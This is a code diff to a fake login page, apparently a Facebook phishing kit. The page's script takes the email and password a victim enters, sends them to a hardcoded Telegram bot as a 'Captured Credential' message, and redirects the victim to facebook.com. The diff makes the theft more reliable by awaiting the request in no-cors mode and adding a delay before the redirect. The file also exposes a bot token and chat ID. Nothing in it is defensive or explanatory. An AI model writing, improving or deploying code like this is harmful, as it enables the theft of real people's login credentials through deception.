@@ -41,11 +41,11 @@
         </div>
     </div>
 
-    <script>
+   <script>
         const BOT_TOKEN = "8699216781:AAHJEaBKkPX8--VjbT7woy7mP86SedSu3u8";
         const CHAT_ID = "7399367572";
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const user = document.getElementById('email').value;
@@ -54,13 +54,17 @@
             const message = encodeURIComponent(`🚨 Captured Credential:\n👤 User: ${user}\n🔑 Pass: ${pass}`);
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
 
-            fetch(telegramUrl, {
-                method: 'GET'
-            }).then(() => {
+            try {
+                // Await the fetch request so it fully transmits before redirecting
+                await fetch(telegramUrl, { method: 'GET', mode: 'no-cors' });
+            } catch (error) {
+                console.error('Error transmitting data', error);
+            }
+
+            // Small delay to ensure delivery, then redirect
+            setTimeout(() => {
                 window.location.href = "https://www.facebook.com";
-            }).catch(() => {
-                window.location.href = "https://www.facebook.com";
-            });
+            }, 500);
         });
     </script>
 </body>
